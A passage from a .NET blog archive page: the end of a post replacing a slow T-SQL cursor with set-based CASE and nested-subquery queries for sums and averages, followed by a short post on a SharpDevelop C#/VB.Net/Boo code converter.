         &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; ELSE                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; SET @tmp = @current_amount                                &#xA0;                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; SET @total = @total &#x2B; @tmp&#xA0;&#xA0;                                 &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0; SET @count = @count &#x2B;1                                &#xA0;                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; FETCH NEXT FROM                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; big_payments INTO @current_amount, @current_NumOfPayments                                &#xA0;                        END                                &#xA0;                        CLOSE big_payments                        DEALLOCATE big_payments                                &#xA0;                        IF (@count &lt;&gt; 0)                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; SET @avg = @total / @count                        &#xA0;                                SELECT @total, @avg                        This query execute in over a minute (01:30, to be exact), this is obviously quite unacceptable, it is possible to use the previous technique here as well, using this statement (runtime over million records is less than a second):            SELECT SUM(                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0; CASE NumOfPayments                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; WHEN NULL THEN Amount                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; WHEN 0 THEN Amount                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; ELSE Amount/NumOfPayments                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0; END                        ) SumOfPayments,                                 SUM(                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0; CASE NumOfPayments                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; WHEN NULL THEN Amount                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; WHEN 0 THEN Amount                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; ELSE Amount/NumOfPayments                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0; END                        ) / count(*) as AveragePayment        FROM Payments                        But this is just ugly, in my opinion, not to mention that it duplicate code. Also, in certain situations it gets ugly (very) fast(think of the case where I need to use both the sum and the average in yet another calculation (the code that started this talk had about seven such calculations, btw).     Here is a better solution, which involve nesting statements, like this:            SELECT                                 &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; SumOfPayments,                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; AvergatePayment = CASE CountOfPayments                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; WHEN NULL THEN                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; SumOfPayments                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; WHEN 0 THEN                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; SumOfPayments                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; ELSE                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; SumOfPayments / CountOfPayments                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; END                        FROM (                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; SELECT SUM(                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0; CASE NumOfPayments                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; WHEN NULL THEN Amount                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; WHEN 0 THEN Amount                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; ELSE Amount/NumOfPayments                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0; END                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; ) SumOfPayments,                                 &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; count(*) as CountOfPayments                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; FROM Payments                        ) TmpCalc                        This method allows for temporary calculations and avoid duplicating code. This statement also run in under a second, and has the same execution plan as the previous one. I have used this method to break up the calculations so I could turn a true masterpiece of cursor based logic into a single (big) SQL statement.</p>
        </article>
        <article id="article-9510">
            <a href="https://ayende.com/blog/977/net-2-0-code-conversion" target="_blank">
                <h2 class="title mb-6" id="article-9510">.Net 2.0 Code Conversion</h2>
            </a>
            <p class="mb-2">by Oren Eini</p>
            <p class="mb-6 flex gap-1.5">
                    <span>
                        <svg width="1.25rem" fill="currentColor" viewBox="0 0 24 24"
                             xmlns="http://www.w3.org/2000/svg"><path
                                xmlns="http://www.w3.org/2000/svg"
                                d="M12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM12 6C12.5523 6 13 6.44772 13 7V11.5858L15.7071 14.2929C16.0976 14.6834 16.0976 15.3166 15.7071 15.7071C15.3166 16.0976 14.6834 16.0976 14.2929 15.7071L11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12V7C11 6.44772 11.4477 6 12 6Z"></path></svg>
                    </span>
                posted on: January 07, 2006
            </p>
            <p class="max-w-full w-full line-clamp-5 text-justify mb-20">This one is Cool. The Sharp Develop folks has a code convertor out that works for .Net 2.0 (including generics!) and it works for C# &lt;-&gt; VB.Net and VB.Net / C# -&gt; Boo!    You can get it here, and there is even a web service&#xA0;you can call to do it automatically from your code. I like the design of only converting to Boo, obviously once you&#x27;ve got your code in Boo, you never need to move it to another language.    This convertor uses the NRefactory&#xA0;library, so it&#x27;s pretty robust, and the code it generates is legible.</p>
        </article>
        <div class="button flex justify-between">
            <a href="950.html"><span class="back arrow"></span></a>

            <a href="952.html"><span class="next arrow"></span></a>
        </div>
    </section>
</main>
<footer
    class="mt-auto flex w-full flex-col items-center justify-center gap-y-2 pb-4 pt-20 text-center align-top font-semibold text-gray-600 dark:text-gray-400 sm:flex-row sm:justify-between sm:text-xs">
    <div class="me-0 sm:me-4">
        <div class="flex flex-wrap items-end gap-x-2">
            <ul class="flex flex-1 items-center gap-x-2 sm:flex-initial">
                <li class="flex">
                    <p class="flex items-end gap-2 justify-center flex-wrap	">Â© Relatively General
                        .NET 2025<span
                            class="inline-block">&nbsp;ðŸš€&nbsp;Theme: Astro Cactus</span>

                        <a class="inline-block sm:hover:text-link" href="https://github.com/chrismwilliams/astro-cactus"
                           rel="noopener noreferrer " target="_blank">
                            <svg width="1em" height="1em" viewBox="0 0 24 24" aria-hidden="true" class="h-6 w-6"
                                 focusable="false" data-icon="mdi:github">
                                <symbol id="ai:mdi:github">
                                    <path fill="currentColor"
                                          d="M12 2A10 10 0 0 0 2 12c0 4.42 2.87 8.17 6.84 9.5c.5.08.66-.23.66-.5v-1.69c-2.77.6-3.36-1.34-3.36-1.34c-.46-1.16-1.11-1.47-1.11-1.47c-.91-.62.07-.6.07-.6c1 .07 1.53 1.03 1.53 1.03c.87 1.52 2.34 1.07 2.91.83c.09-.65.35-1.09.63-1.34c-2.22-.25-4.55-1.11-4.55-4.92c0-1.11.38-2 1.03-2.71c-.1-.25-.45-1.29.1-2.64c0 0 .84-.27 2.75 1.02c.79-.22 1.65-.33 2.5-.33s1.71.11 2.5.33c1.91-1.29 2.75-1.02 2.75-1.02c.55 1.35.2 2.39.1 2.64c.65.71 1.03 1.6 1.03 2.71c0 3.82-2.34 4.66-4.57 4.91c.36.31.69.92.69 1.85V21c0 .27.16.59.67.5C19.14 20.16 22 16.42 22 12A10 10 0 0 0 12 2"></path>
                                </symbol>
                                <use xlink:href="#ai:mdi:github"></use>
                            </svg>
                            <span class="sr-only">Github</span>
                        </a>
                    </p>
                </li>
            </ul>
        </div>
    </div>
    <nav aria-label="More on this site" class="flex gap-x-2 sm:gap-x-0 sm:divide-x sm:divide-gray-500">
        <a class="px-4 py-2 sm:py-0 sm:hover:text-textColor sm:hover:underline" href="index.html"> Home </a><a
            class="px-4 py-2 sm:py-0 sm:hover:text-textColor sm:hover:underline" href="/about/"> About </a>
    </nav>
</footer>
<script src="js/script.js?id=af8f4559935e7bf5bf6015373793411d"></script>
<script src="pagefind/pagefind-ui.js"></script>

<!-- Cookie Consent Banner -->
<div class="cookie-consent" id="cookieConsent">
    <div>
        <p class="text-sm">We use cookies to analyze our website traffic and provide a better browsing experience. By
            continuing to use our site, you agree to our use of cookies.</p>
    </div>
    <div class="cookie-consent-buttons">
        <button class="cookie-consent-decline" onclick="declineCookies()">Decline</button>
        <button class="cookie-consent-accept" onclick="acceptCookies()">Accept</button>
    </div>
</div>

<script>
    // Cookie consent management
    function showCookieConsent() {
        const consent = localStorage.getItem('cookieConsent');
        if (!consent) {
            document.getElementById('cookieConsent').classList.add('show');
        }
    }

    function acceptCookies() {
        localStorage.setItem('cookieConsent', 'accepted');
        document.getElementById('cookieConsent').classList.remove('show');
        loadGA(); // Load Google Analytics after consent
    }

    function declineCookies() {
        localStorage.setItem('cookieConsent', 'declined');
        document.getElementById('cookieConsent').classList.remove('show');
    }

    // Show the consent banner only for EU visitors (you can add more country codes as needed)
    fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const euCountries = ['AT', 'BE', 'BG', 'HR', 'CY', 'CZ', 'DK', 'EE', 'FI', 'FR', 'DE', 'GR', 'HU', 'IE', 'IT', 'LV', 'LT', 'LU', 'MT', 'NL', 'PL', 'PT', 'RO', 'SK', 'SI', 'ES', 'SE'];
                if (euCountries.includes(data.country_code)) {
                    showCookieConsent();
                } else {
                    // For non-EU visitors, automatically load GA
                    if (!localStorage.getItem('cookieConsent')) {
                        localStorage.setItem('cookieConsent', 'accepted');
                        loadGA();
                    }
                }
            })
            .catch(() => {
                // If we can't determine location, show the consent banner to be safe
                showCookieConsent();
            });
</script>
</body>
</html>